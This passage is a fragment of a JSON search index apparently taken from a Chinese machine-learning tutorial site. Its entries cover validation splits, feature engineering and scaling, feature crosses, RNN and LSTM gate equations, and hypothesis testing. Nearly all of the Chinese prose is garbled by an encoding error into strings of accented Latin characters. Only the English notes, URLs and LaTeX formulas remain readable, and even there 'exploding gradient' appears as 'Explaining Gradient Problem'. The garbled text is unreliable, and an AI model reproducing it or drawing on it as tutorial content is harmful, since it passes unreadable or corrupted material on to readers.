æ‚¨å¯ä»¥æƒ³è±¡æŒ‰å¦‚ä¸‹æ–¹å¼æ‹†åˆ†å•ä¸ªæ•°æ®é›†ï¼š\n"},{"id":328,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/7.validation/","title":"7. Validation","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"éªŒè¯é›† #  ä¸Šä¸€å•å…ƒä»‹ç»äº†å¦‚ä½•å°†æ•°æ®é›†åˆ’åˆ†ä¸ºè®­ç»ƒé›†å’Œæµ‹è¯•é›†ã€‚å€ŸåŠ©è¿™ç§åˆ’åˆ†ï¼Œæ‚¨å¯ä»¥å¯¹ä¸€ä¸ªæ ·æœ¬é›†è¿›è¡Œè®­ç»ƒï¼Œç„¶åä½¿ç”¨ä¸åŒçš„æ ·æœ¬é›†æµ‹è¯•æ¨¡å‹ã€‚é‡‡ç”¨ä¸¤ç§åˆ†ç±»ä¹‹åï¼Œå·¥ä½œæµç¨‹å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š\nå°†æ•°æ®é›†åˆ’åˆ†ä¸ºä¸¤ä¸ªå­é›†æ˜¯ä¸ªä¸é”™çš„æƒ³æ³•ï¼Œä½†ä¸æ˜¯ä¸‡èƒ½è‰¯æ–¹ã€‚é€šè¿‡å°†æ•°æ®é›†åˆ’åˆ†ä¸ºä¸‰ä¸ªå­é›†ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œæ‚¨å¯ä»¥å¤§å¹…é™ä½è¿‡æ‹Ÿåˆçš„å‘ç”Ÿå‡ ç‡ï¼š\nä½¿ç”¨éªŒè¯é›†è¯„ä¼°è®­ç»ƒé›†çš„æ•ˆæœã€‚ç„¶åï¼Œåœ¨æ¨¡å‹â€œé€šè¿‡â€éªŒè¯é›†ä¹‹åï¼Œä½¿ç”¨æµ‹è¯•é›†å†æ¬¡æ£€æŸ¥è¯„ä¼°ç»“æœã€‚ä¸‹å›¾å±•ç¤ºäº†è¿™ä¸€æ–°å·¥ä½œæµç¨‹ï¼š\nåœ¨è¿™ä¸€ç»è¿‡æ”¹è¿›çš„å·¥ä½œæµç¨‹ä¸­ï¼š\n é€‰æ‹©åœ¨éªŒè¯é›†ä¸Šè·å¾—æœ€ä½³æ•ˆæœçš„æ¨¡å‹ã€‚ ä½¿ç”¨æµ‹è¯•é›†å†æ¬¡æ£€æŸ¥è¯¥æ¨¡å‹ã€‚  è¯¥å·¥ä½œæµç¨‹ä¹‹æ‰€ä»¥æ›´å¥½ï¼ŒåŸå› åœ¨äºå®ƒæš´éœ²ç»™æµ‹è¯•é›†çš„ä¿¡æ¯æ›´å°‘ã€‚\n"},{"id":329,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/8.representation/","title":"8. Representation","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"ç‰¹å¾å·¥ç¨‹ #  å°†åŸå§‹æ•°æ®æ˜ å°„åˆ°ç‰¹å¾ #  ä¸‹å›¾å·¦ä¾§è¡¨ç¤ºæ¥è‡ªè¾“å…¥æ•°æ®æºçš„åŸå§‹æ•°æ®ï¼Œå³ä¾§è¡¨ç¤ºç‰¹å¾çŸ¢é‡ï¼Œä¹Ÿå°±æ˜¯ç»„æˆæ•°æ®é›†ä¸­æ ·æœ¬çš„æµ®ç‚¹å€¼é›†ã€‚ ç‰¹å¾å·¥ç¨‹æŒ‡çš„æ˜¯å°†åŸå§‹æ•°æ®è½¬æ¢ä¸ºç‰¹å¾çŸ¢é‡ã€‚è¿›è¡Œç‰¹å¾å·¥ç¨‹é¢„è®¡éœ€è¦å¤§é‡æ—¶é—´ã€‚\nè®¸å¤šæœºå™¨å­¦ä¹ æ¨¡å‹éƒ½å¿…é¡»å°†ç‰¹å¾è¡¨ç¤ºä¸ºå®æ•°å‘é‡ï¼Œå› ä¸ºç‰¹å¾å€¼å¿…é¡»ä¸æ¨¡å‹æƒé‡ç›¸ä¹˜ã€‚\næ•°æ®è¡¨ç¤º #  æ˜ å°„æ•°å€¼ï¼š\n æ•´æ•°å’Œæµ®ç‚¹æ•°æ®ä¸éœ€è¦ç‰¹æ®Šç¼–ç ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥ä¸æ•°å­—æƒé‡ç›¸ä¹˜ã€‚  æ˜ å°„åˆ†ç±»å€¼ï¼š\n  åˆ†ç±»ç‰¹å¾å…·æœ‰ä¸€ç»„ç¦»æ•£çš„å¯èƒ½å€¼ã€‚\n  ç”±äºæ¨¡å‹ä¸èƒ½å°†å­—ç¬¦ä¸²ä¸å­¦ä¹ åˆ°çš„æƒé‡ç›¸ä¹˜ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ç‰¹å¾å·¥ç¨‹å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—å€¼ï¼š\nè¦å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªä»ç‰¹å¾å€¼ï¼ˆæˆ‘ä»¬å°†å…¶ç§°ä¸ºå¯èƒ½å€¼çš„è¯æ±‡è¡¨ï¼‰åˆ°æ•´æ•°çš„æ˜ å°„ã€‚ä¸–ç•Œä¸Šçš„æ¯æ¡è¡—é“å¹¶ééƒ½ä¼šå‡ºç°åœ¨æˆ‘ä»¬çš„æ•°æ®é›†ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰å…¶ä»–è¡—é“åˆ†ç»„ä¸ºä¸€ä¸ªå…¨éƒ¨åŒ…ç½—çš„â€œå…¶ä»–â€ç±»åˆ«ï¼Œç§°ä¸º OOVï¼ˆè¯æ±‡è¡¨å¤–ï¼‰åˆ†æ¡¶ã€‚\n  è¿™ç§ç¼–ç å­˜åœ¨ä¸èƒ½è®¾ç½®æƒé‡ã€ä¸èƒ½åŒæ—¶è¡¨ç¤ºå¤šä¸ªç­‰é™åˆ¶ã€‚\nè¦å»é™¤è¿™äº›é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¨¡å‹ä¸­çš„æ¯ä¸ªåˆ†ç±»ç‰¹å¾åˆ›å»ºä¸€ä¸ªäºŒå…ƒå‘é‡æ¥è¡¨ç¤ºè¿™äº›å€¼ï¼Œå¦‚ä¸‹æ‰€è¿°ï¼š\n å¯¹äºé€‚ç”¨äºæ ·æœ¬çš„å€¼ï¼Œå°†ç›¸åº”å‘é‡å…ƒç´ è®¾ä¸º 1ã€‚ å°†æ‰€æœ‰å…¶ä»–å…ƒç´ è®¾ä¸º 0ã€‚    è¯¥å‘é‡çš„é•¿åº¦ç­‰äºè¯æ±‡è¡¨ä¸­çš„å…ƒç´ æ•°ã€‚å½“åªæœ‰ä¸€ä¸ªå€¼ä¸º 1 æ—¶ï¼Œè¿™ç§è¡¨ç¤ºæ³•ç§°ä¸ºç‹¬çƒ­ç¼–ç ï¼›å½“æœ‰å¤šä¸ªå€¼ä¸º 1 æ—¶ï¼Œè¿™ç§è¡¨ç¤ºæ³•ç§°ä¸ºå¤šçƒ­ç¼–ç ã€‚ä¾‹å­å¦‚ä¸‹å›¾ï¼š\n  ç¨€ç–è¡¨ç¤ºæ³• #  å‡è®¾æ•°æ®é›†ä¸­æœ‰ 100 ä¸‡ä¸ªä¸åŒçš„è¡—é“åç§°ï¼Œæ‚¨å¸Œæœ›å°†å…¶åŒ…å«ä¸º street_name çš„å€¼ã€‚å¦‚æœç›´æ¥åˆ›å»ºä¸€ä¸ªåŒ…å« 100 ä¸‡ä¸ªå…ƒç´ çš„äºŒå…ƒå‘é‡ï¼Œå…¶ä¸­åªæœ‰ 1 æˆ– 2 ä¸ªå…ƒç´ ä¸º tureï¼Œåˆ™æ˜¯ä¸€ç§éå¸¸ä½æ•ˆçš„è¡¨ç¤ºæ³•ï¼Œåœ¨å¤„ç†è¿™äº›å‘é‡æ—¶ä¼šå ç”¨å¤§é‡çš„å­˜å‚¨ç©ºé—´å¹¶è€—è´¹å¾ˆé•¿çš„è®¡ç®—æ—¶é—´ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ç§å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ç¨€ç–è¡¨ç¤ºæ³•ï¼Œå…¶ä¸­ä»…å­˜å‚¨éé›¶å€¼ã€‚åœ¨ç¨€ç–è¡¨ç¤ºæ³•ä¸­ï¼Œä»ç„¶ä¸ºæ¯ä¸ªç‰¹å¾å€¼å­¦ä¹ ç‹¬ç«‹çš„æ¨¡å‹æƒé‡ï¼Œå¦‚ä¸Šæ‰€è¿°ã€‚\nå…³é”®è¯ #  ç¦»æ•£ç‰¹å¾ã€ç‰¹å¾å·¥ç¨‹ã€ç‹¬çƒ­ç¼–ç ã€è¡¨ç¤º\nè‰¯å¥½çš„ç‰¹å¾å·¥ç¨‹ #  1. é¿å…å¾ˆå°‘ä½¿ç”¨çš„ç¦»æ•£ç‰¹å¾å€¼ï¼š #  è‰¯å¥½çš„ç‰¹å¾å€¼åº”è¯¥åœ¨æ•°æ®é›†ä¸­å‡ºç°å¤§çº¦ 5 æ¬¡ä»¥ä¸Šã€‚\nç›¸åï¼Œå¦‚æœæŸä¸ªç‰¹å¾çš„å€¼ä»…å‡ºç°ä¸€æ¬¡æˆ–è€…å¾ˆå°‘å‡ºç°ï¼Œåˆ™æ¨¡å‹å°±æ— æ³•æ ¹æ®è¯¥ç‰¹å¾è¿›è¡Œé¢„æµ‹ã€‚\n2. æœ€å¥½å…·æœ‰æ˜ç¡®æ¸…æ™°çš„å«ä¹‰ï¼š #  æ¯ä¸ªç‰¹å¾å¯¹äºé¡¹ç›®ä¸­çš„ä»»ä½•äººæ¥è¯´éƒ½åº”è¯¥å…·æœ‰æ¸…æ™°æ˜ç¡®çš„å«ä¹‰ã€‚\n3. ä¸è¦å°†â€œç¥å¥‡â€çš„å€¼ä¸å®é™…æ•°æ®æ··ä¸ºä¸€è°ˆã€‚ #  ä¸ºè§£å†³ç¥å¥‡å€¼çš„é—®é¢˜ï¼Œéœ€å°†è¯¥ç‰¹å¾è½¬æ¢ä¸ºä¸¤ä¸ªç‰¹å¾ï¼š\n ä¸€ä¸ªç‰¹å¾åªå­˜å‚¨è´¨é‡è¯„åˆ†ï¼Œä¸å«ç¥å¥‡å€¼ã€‚ ä¸€ä¸ªç‰¹å¾å­˜å‚¨å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æä¾›äº† quality_ratingã€‚ä¸ºè¯¥å¸ƒå°”å€¼ç‰¹å¾æŒ‡å®šä¸€ä¸ªåç§°ï¼Œä¾‹å¦‚ is_quality_rating_definedã€‚  4. è€ƒè™‘ä¸Šæ¸¸çš„ä¸ç¨³å®šæ€§ï¼šç‰¹å¾çš„å®šä¹‰ä¸åº”éšæ—¶é—´å‘ç”Ÿå˜åŒ–ã€‚ #  ä¾‹å¦‚ï¼šä¸‹åˆ—å€¼æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºåŸå¸‚åç§°ä¸€èˆ¬ä¸ä¼šæ”¹å˜ã€‚ï¼ˆæ³¨æ„ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦å°† â€œbr/sao_pauloâ€ è¿™æ ·çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºç‹¬çƒ­çŸ¢é‡ã€‚ï¼‰\ncity_id: \u0026#34;br/sao_paulo\u0026#34; ä½†æ”¶é›†ç”±å…¶ä»–æ¨¡å‹æ¨ç†çš„å€¼ä¼šäº§ç”Ÿé¢å¤–æˆæœ¬ã€‚å¯èƒ½å€¼â€œ219â€ç›®å‰ä»£è¡¨åœ£ä¿ç½—ï¼Œä½†è¿™ç§è¡¨ç¤ºåœ¨æœªæ¥è¿è¡Œå…¶ä»–æ¨¡å‹æ—¶å¯èƒ½è½»æ˜“å‘ç”Ÿå˜åŒ–ï¼š\ninferred_city_cluster: \u0026#34;219\u0026#34; æ¸…ç†æ•°æ® #  1. ç¼©æ”¾ç‰¹å¾å€¼ #  ç¼©æ”¾æ˜¯æŒ‡å°†æµ®ç‚¹ç‰¹å¾å€¼ä»è‡ªç„¶èŒƒå›´ï¼ˆä¾‹å¦‚ 100 åˆ° 900ï¼‰è½¬æ¢ä¸ºæ ‡å‡†èŒƒå›´ï¼ˆä¾‹å¦‚ 0 åˆ° 1 æˆ– -1 åˆ° +1ï¼‰ã€‚å¦‚æœæŸä¸ªç‰¹å¾é›†åªåŒ…å«ä¸€ä¸ªç‰¹å¾ï¼Œåˆ™ç¼©æ”¾å¯ä»¥æä¾›çš„å®é™…å¥½å¤„å¾®ä¹å…¶å¾®æˆ–æ ¹æœ¬æ²¡æœ‰ã€‚ä¸è¿‡ï¼Œå¦‚æœç‰¹å¾é›†åŒ…å«å¤šä¸ªç‰¹å¾ï¼Œåˆ™ç¼©æ”¾ç‰¹å¾å¯ä»¥å¸¦æ¥ä»¥ä¸‹ä¼˜åŠ¿ï¼š\n å¸®åŠ©æ¢¯åº¦ä¸‹é™æ³•æ›´å¿«é€Ÿåœ°æ”¶æ•›ã€‚ å¸®åŠ©é¿å…â€œNaN é™·é˜±â€ã€‚åœ¨è¿™ç§é™·é˜±ä¸­ï¼Œæ¨¡å‹ä¸­çš„ä¸€ä¸ªæ•°å€¼å˜æˆ NaNï¼ˆä¾‹å¦‚ï¼Œå½“æŸä¸ªå€¼åœ¨è®­ç»ƒæœŸé—´è¶…å‡ºæµ®ç‚¹ç²¾ç¡®ç‡é™åˆ¶æ—¶ï¼‰ï¼Œå¹¶ä¸”æ¨¡å‹ä¸­çš„æ‰€æœ‰å…¶ä»–æ•°å€¼æœ€ç»ˆä¹Ÿä¼šå› æ•°å­¦è¿ç®—è€Œå˜æˆ NaNã€‚ å¸®åŠ©æ¨¡å‹ä¸ºæ¯ä¸ªç‰¹å¾ç¡®å®šåˆé€‚çš„æƒé‡ã€‚å¦‚æœæ²¡æœ‰è¿›è¡Œç‰¹å¾ç¼©æ”¾ï¼Œåˆ™æ¨¡å‹ä¼šå¯¹èŒƒå›´è¾ƒå¤§çš„ç‰¹å¾æŠ•å…¥è¿‡å¤šç²¾åŠ›ã€‚  æ‚¨ä¸éœ€è¦å¯¹æ¯ä¸ªæµ®ç‚¹ç‰¹å¾è¿›è¡Œå®Œå…¨ç›¸åŒçš„ç¼©æ”¾ã€‚å³ä½¿ç‰¹å¾ A çš„èŒƒå›´æ˜¯ -1 åˆ° +1ï¼ŒåŒæ—¶ç‰¹å¾ B çš„èŒƒå›´æ˜¯ -3 åˆ° +3ï¼Œä¹Ÿä¸ä¼šäº§ç”Ÿä»€ä¹ˆæ¶åŠ£çš„å½±å“ã€‚ä¸è¿‡ï¼Œå¦‚æœç‰¹å¾ B çš„èŒƒå›´æ˜¯ 5000 åˆ° 100000ï¼Œæ‚¨çš„æ¨¡å‹ä¼šå‡ºç°ç³Ÿç³•çš„å“åº”ã€‚\n2. å¤„ç†æç«¯çš„ç¦»ç¾¤å€¼ #  å¦‚ä½•æœ€å¤§é™åº¦é™ä½è¿™äº›æç«¯ç¦»ç¾¤å€¼çš„å½±å“ï¼Ÿ\n  ä¸€ç§æ–¹æ³•æ˜¯å¯¹æ¯ä¸ªå€¼å–å¯¹æ•°ã€‚\nå¯¹æ•°ç¼©æ”¾å¯ç¨ç¨ç¼“è§£è¿™ç§å½±å“ï¼Œä½†ä»ç„¶å­˜åœ¨ç¦»ç¾¤å€¼è¿™ä¸ªå¤§å°¾å·´ã€‚\n  åªæ˜¯ç®€å•åœ°å°†çš„æœ€å¤§å€¼â€œé™åˆ¶â€ä¸ºæŸä¸ªä»»æ„å€¼ï¼ˆæ¯”å¦‚ 4.0ï¼‰ï¼Œæ‰€æœ‰å¤§äº 4.0 çš„å€¼éƒ½å°†å˜æˆ 4.0ã€‚\n  3. åˆ†ç®± #  ä¸ºäº†å°†çº¬åº¦å˜ä¸ºä¸€é¡¹å®ç”¨çš„é¢„æµ‹æŒ‡æ ‡ï¼Œæˆ‘ä»¬å¯¹çº¬åº¦â€œåˆ†ç®±â€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næˆ‘ä»¬ç°åœ¨æ‹¥æœ‰ 11 ä¸ªä¸åŒçš„å¸ƒå°”å€¼ç‰¹å¾ï¼ˆLatitudeBin1ã€LatitudeBin2ã€â€¦ã€LatitudeBin11ï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæµ®ç‚¹ç‰¹å¾ã€‚æ‹¥æœ‰ 11 ä¸ªä¸åŒçš„ç‰¹å¾æœ‰ç‚¹ä¸æ–¹ä¾¿ï¼Œå› æ­¤æˆ‘ä»¬å°†å®ƒä»¬ç»Ÿä¸€æˆä¸€ä¸ª 11 å…ƒç´ çŸ¢é‡ã€‚è¿™æ ·åšä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°†çº¬åº¦ 37.4 è¡¨ç¤ºä¸ºï¼š\n[0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0] 4. æ¸…æŸ¥ #  æˆªè‡³ç›®å‰ï¼Œæˆ‘ä»¬å‡å®šç”¨äºè®­ç»ƒå’Œæµ‹è¯•çš„æ‰€æœ‰æ•°æ®éƒ½æ˜¯å€¼å¾—ä¿¡èµ–çš„ã€‚åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ•°æ®é›†ä¸­çš„å¾ˆå¤šæ ·æœ¬æ˜¯ä¸å¯é çš„ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸€ç§æˆ–å¤šç§ï¼š\n é—æ¼å€¼ã€‚ ä¾‹å¦‚ï¼Œæœ‰äººå¿˜è®°ä¸ºæŸä¸ªæˆ¿å±‹çš„å¹´é¾„è¾“å…¥å€¼ã€‚ é‡å¤æ ·æœ¬ã€‚ ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨é”™è¯¯åœ°å°†åŒä¸€æ¡è®°å½•ä¸Šä¼ äº†ä¸¤æ¬¡ã€‚ ä¸è‰¯æ ‡ç­¾ã€‚ ä¾‹å¦‚ï¼Œæœ‰äººé”™è¯¯åœ°å°†ä¸€é¢—æ©¡æ ‘çš„å›¾ç‰‡æ ‡è®°ä¸ºæ«æ ‘ã€‚ ä¸è‰¯ç‰¹å¾å€¼ã€‚ ä¾‹å¦‚ï¼Œæœ‰äººè¾“å…¥äº†å¤šä½™çš„ä½æ•°ï¼Œæˆ–è€…æ¸©åº¦è®¡è¢«é—è½åœ¨å¤ªé˜³åº•ä¸‹ã€‚  å…³é”®è¯ #  å…³é”®å­—è¯ï¼š\nåˆ†ç®±ã€ç‰¹å¾é›† ã€NaN é™·é˜±ã€ç¦»ç¾¤å€¼ã€ç¼©æ”¾\n"},{"id":330,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/9.featurecrosses/","title":"9. Feature Crosses","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"ç‰¹å¾ç»„åˆ #  å¯¹éçº¿æ€§è§„å¾‹è¿›è¡Œç»„åˆ #  ç‰¹å¾ç»„åˆæ˜¯æŒ‡é€šè¿‡å°†ä¸¤ä¸ªæˆ–å¤šä¸ªè¾“å…¥ç‰¹å¾ç›¸ä¹˜æ¥å¯¹ç‰¹å¾ç©ºé—´ä¸­çš„éçº¿æ€§è§„å¾‹è¿›è¡Œç¼–ç çš„åˆæˆç‰¹å¾ã€‚â€œcrossâ€ï¼ˆç»„åˆï¼‰è¿™ä¸€æœ¯è¯­æ¥è‡ª cross productï¼ˆå‘é‡ç§¯ï¼‰ã€‚\næˆ‘ä»¬é€šè¿‡å°† $$x_1$$ ä¸ $$x_2$$ ç»„åˆæ¥åˆ›å»ºä¸€ä¸ªåä¸º $$x_3$$ çš„ç‰¹å¾ç»„åˆï¼š$$x_3 = x_1 x_2$$\næˆ‘ä»¬åƒå¤„ç†å…¶ä»–ç‰¹å¾ä¸€æ ·æ¥å¤„ç†è¿™ä¸ªæ–°å»ºçš„ $$x_3$$ ç‰¹å¾ç»„åˆã€‚çº¿æ€§å…¬å¼å˜ä¸ºï¼š$$y = b + w_1x_1 + w_2x_2 + w_3x_3$$\nçº¿æ€§ç®—æ³•å¯ä»¥ç®—å‡º $$w_3$$ çš„æƒé‡ï¼Œå°±åƒç®—å‡º $$w_1$$ å’Œ $$w_2$$ çš„æƒé‡ä¸€æ ·ã€‚æ¢è¨€ä¹‹ï¼Œè™½ç„¶ $$w_3$$ è¡¨ç¤ºéçº¿æ€§ä¿¡æ¯ï¼Œä½†æ‚¨ä¸éœ€è¦æ”¹å˜çº¿æ€§æ¨¡å‹çš„è®­ç»ƒæ–¹å¼æ¥ç¡®å®š $$w_3$$ çš„å€¼ã€‚\næˆ‘ä»¬å¯ä»¥åˆ›å»ºå¾ˆå¤šä¸åŒç§ç±»çš„ç‰¹å¾ç»„åˆã€‚ä¾‹å¦‚ï¼š\n [A X B]ï¼šå°†ä¸¤ä¸ªç‰¹å¾çš„å€¼ç›¸ä¹˜å½¢æˆçš„ç‰¹å¾ç»„åˆï¼› [A X B X C X D X E]ï¼šå°†äº”ä¸ªç‰¹å¾å€¼ç›¸ä¹˜å½¢æˆçš„ç‰¹å¾ç»„åˆï¼› [A X A]ï¼šå¯¹å•ä¸ªç‰¹å¾çš„å€¼æ±‚å¹³æ–¹å½¢æˆçš„ç‰¹å¾ç»„åˆã€‚  å…³é”®å­—è¯ï¼šç‰¹å¾ç»„åˆã€åˆæˆç‰¹å¾\nç»„åˆç‹¬çƒ­çŸ¢é‡ #  ç¬›å¡å„¿ç§¯\n"},{"id":331,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/rnn/","title":"Rnn","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":" å­¦ä¹ åœ°å€ï¼š\n https://www.youtube.com/watch?v=lWkFhVq9-nc   introduction to RNN #  Feed Forward Neural Network, FFNN #  In a Feed-Forward Network, information flow only in forward direction.\ngraph LR;\rI{input}; IL(Input Layer); HL(Hidden Layer); OL(Output Layer); O{Predicted output}\rI--\u0026gt;IL; IL--\u0026gt;HL; HL--\u0026gt;OL; OL--\u0026gt;O;  Decisions are based on current input. No memory about the past. No future scope.  Question:\n cannot handle sequential data. considers only the current input. cannot memorize previous inputs.  Recurrent Neural Network, RNN #  graph LR;\rI{input}; IL(Input Layer); HL(Hidden Layer); OL(Output Layer); O{Predicted output}\rI--\u0026gt;IL; IL--\u0026gt;HL; HL--\u0026gt;OL; OL--\u0026gt;O; HL--\u0026gt;HL; How does RNN works?\nTypes of RNNï¼š\n  many to one network\n  many to many network\n  Gradient Problem: #   Vanishing Gradient Problem. Explaining Gradient Problem.  Solution to Gradient Problem:\nLong Short-Term Memory Network, LSTM #  LSTMs are special kind of RNN, capable of learning long-term dependencies.\nThree steps of LSTMs:\nStep-1: Decides how much of the past it should remember #  It looks at the previous state ($$h_{t-1}$$) and the current input $$x_t$$ and computes the function.\n $$f_t = \\sigma(W_f [h_{t-1}, x_t] + b_f)$$, $$f_t$$ is called forget gate.  Step-2: Decides how much should this unit add to the current state #  There are 2 parts:\n  One is sigmoid function, it decides which values to let through (0 or 1).\n$$i_t = \\sigma(W_i [h_{t-1}, x_t] + b_i)$$\n  The other is tanh function, which gives the weightage to the value which are passed deciding their level of importance (-1 to 1).\n$$\\overset{\\sim}{C_t} = tanh(W_C [h_{t-1}, x_t] + b_c)$$\n  Step-3: Decides what part of the current cell state makes it to the output #  $$o_t = \\sigma(W_o [h_{t-1}, x_t] + b_0)$$, $$o_t$$ is called output gate.\n$$h_t = o_t * tanh(C_t)$$\nImplementation of LSTM #  "},{"id":332,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/","title":"å‡è®¾æ£€éªŒ","section":"æ¦‚ç‡è®º","content":"å‡è®¾æ£€éªŒ #  æ¦‚å¿µ #  åŸå‡è®¾å’Œå¤‡é€‰å‡è®¾ #  åŸå‡è®¾ï¼ˆnull hypothesisï¼‰ï¼š$$H_0$$\n åŸæ¥å°±æœ‰çš„å‡è®¾ ç»è¿‡é•¿æœŸè¯æ˜æ˜¯å¯¹çš„  å¯¹ç«‹å‡è®¾ /å¤‡æ‹©å‡è®¾ï¼ˆalternative hypothesisï¼‰ï¼š$$ H_1 $$\nå‚æ•°çš„å‡è®¾ä¸€èˆ¬å…·æœ‰å¦‚ä¸‹ä¸‰ç§å½¢å¼ï¼š\n   åŸå‡è®¾ $$H_0$$ å¤‡é€‰å‡è®¾ $$H_1$$ è®°ä½œ åˆ†ç±»     $$\\theta = \\theta_0$$ $$\\theta \\ne \\theta_0$$ $$H_0(I)$$ åŒä¾§æ£€éªŒ   $$\\theta \\ge \\theta_0$$ $$\\theta \\lt \\theta_0$$ $$H_0(II)$$ å•ä¾§æ£€éªŒ   $$\\theta \\le \\theta_0$$ $$\\theta \\gt \\theta_0$$ $$H_0(III)$$ å•ä¾§æ£€éªŒ    å‡è®¾æ£€éªŒï¼šå°±æ˜¯é€šè¿‡æ ·æœ¬æ¥å›ç­”åŸå‡è®¾æ˜¯æ­£ç¡®è¿˜æ˜¯é”™è¯¯ã€‚\næ£€éªŒç»Ÿè®¡é‡ #  æ£€éªŒç»Ÿè®¡é‡çš„å–å€¼èŒƒå›´å’Œå˜åŒ–æƒ…å†µï¼Œèƒ½åŒ…å«å’Œåæ˜  $$ H_0 $$ ä¸$$ H_1 $$ æ‰€æè¿°çš„å†…å®¹ï¼Œå¹¶ä¸”å½“ $$ H_0 $$ æˆç«‹æ—¶ï¼Œèƒ½å¤Ÿç¡®å®šæ£€éªŒç»Ÿè®¡é‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚\næ£€éªŒç»Ÿè®¡é‡çš„åŸºæœ¬å½¢å¼ä¾‹å¦‚ï¼š$${\\displaystyle z = \\frac{\\overline{x} - \\mu_0}{ \\sigma/\\sqrt{n} }}$$\næ˜¾è‘—æ€§æ°´å¹³ #    åŸå‡è®¾ $$H_0$$ æ­£ç¡®ï¼Œè€Œè¢«æˆ‘ä»¬æ‹’ç»ï¼ŒçŠ¯è¿™ç§é”™è¯¯çš„æ¦‚ç‡ç”¨ $$\\alpha$$ è¡¨ç¤ºã€‚æŠŠ $$\\alpha$$ ç§°ä¸ºå‡è®¾æ£€éªŒä¸­çš„æ˜¾è‘—æ€§æ°´å¹³ï¼ˆSignificant levelï¼‰ï¼Œå³å†³ç­–ä¸­çš„é£é™©ã€‚\n  æ˜¾è‘—æ€§æ°´å¹³å°±æ˜¯æŒ‡å½“åŸå‡è®¾æ­£ç¡®æ—¶å´æŠŠå®ƒæ‹’ç»çš„æ¦‚ç‡æˆ–é£é™©ã€‚\n  é€šå¸¸å– $$\\alphaï¼0.05$$ æˆ– $$ \\alpha =0.01$$ æˆ– $$\\alpha=0.001$$ï¼Œé‚£ä¹ˆï¼Œæ¥å—åŸå‡è®¾æ—¶æ­£ç¡®çš„å¯èƒ½æ€§ï¼ˆæ¦‚ç‡ï¼‰ä¸ºï¼š95%ï¼Œ99%ï¼Œ99.9%ã€‚\n  æ­¥éª¤ #    æå‡ºåŸå‡è®¾å’Œå¤‡æ‹©å‡è®¾\n  ç¡®å®šé€‚å½“çš„æ£€éªŒç»Ÿè®¡é‡\n  è§„å®šæ˜¾è‘—æ€§æ°´å¹³\n  è®¡ç®—æ£€éªŒç»Ÿé‡çš„å€¼\n  ä½œå‡ºç»Ÿè®¡å†³ç­–\n  æ­£æ€åˆ†å¸ƒæ€»ä½“å‡å€¼çš„å‡è®¾æ£€éªŒ #  1. å•ä¸ªæ­£æ€åˆ†å¸ƒæ€»ä½“çš„å‡å€¼æ£€éªŒ #  1.1 æ–¹å·®å·²çŸ¥ $$\\rightarrow$$ Z æ£€éªŒæ³• #   æ€»ä½“ $$X \\sim N(\\mu , \\sigma^2)$$ï¼Œ$$\\sigma$$ å·²çŸ¥ï¼Œå‡è®¾ $$H_0: \\mu = \\mu_0; H_1: \\mu \\ne \\mu_0$$\n æ„é€  U ç»Ÿè®¡é‡ $${\\displaystyle Z = \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\sim N(0,1)}$$\nç”± $${\\displaystyle P\\Big(\\mid \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\mid \\ge u_{\\alpha/2}\\Big) = \\alpha}$$ï¼Œç¡®å®šæ‹’ç»åŸŸ $$|Z| \\ge 